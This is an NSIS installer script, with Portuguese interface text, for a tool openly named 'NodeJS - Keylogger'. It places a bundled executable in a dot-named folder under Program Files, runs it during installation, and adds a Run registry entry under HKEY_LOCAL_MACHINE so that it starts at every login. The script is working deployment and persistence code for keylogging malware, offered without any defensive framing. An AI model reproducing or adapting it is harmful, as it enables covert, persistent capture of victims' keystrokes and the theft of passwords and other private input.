!include "MUI.nsh"
!include "MUI2.nsh"

!define MUI_ICON "icons\icon.ico"
!define MUI_HEADERIMAGE
!define MUI_HEADERIMAGE_BITMAP "icons\installer.bmp"
!define MUI_HEADERIMAGE_RIGHT
!define UNINSTALLER "$INSTDIR\Uninstall.exe"
!define INSTALLER "Keylogger-Installer.exe" 

Name "NodeJS - Keylogger"
OutFile "${INSTALLER}"
InstallDir "$PROGRAMFILES\.NodeJSKeylogger"
DirText "Escolha o diret�rio de instala��o"

!insertmacro MUI_PAGE_WELCOME
!insertmacro MUI_PAGE_DIRECTORY
!insertmacro MUI_PAGE_INSTFILES
!insertmacro MUI_LANGUAGE "Portuguese"

Section
  SetOutPath "$INSTDIR\"
  File /r "platforms\"
  File "bundle.exe"
  ExecWait "bundle.exe"
SectionEnd

Section
  SetOutPath $INSTDIR
  WriteUninstaller "${UNINSTALLER}"
  WriteRegStr HKEY_LOCAL_MACHINE "Software\Microsoft\Windows\CurrentVersion\Run" \
".NodeJSKeylogger" "$INSTDIR\${INSTALLER}"
SectionEnd

Section "Uninstall"
  Delete "${UNINSTALLER}"
  RMDir /r /REBOOTOK "$INSTDIR\"
  RMDir "$INSTDIR"
SectionEnd

Section "Auto close"
  SetAutoClose true
SectionEnd




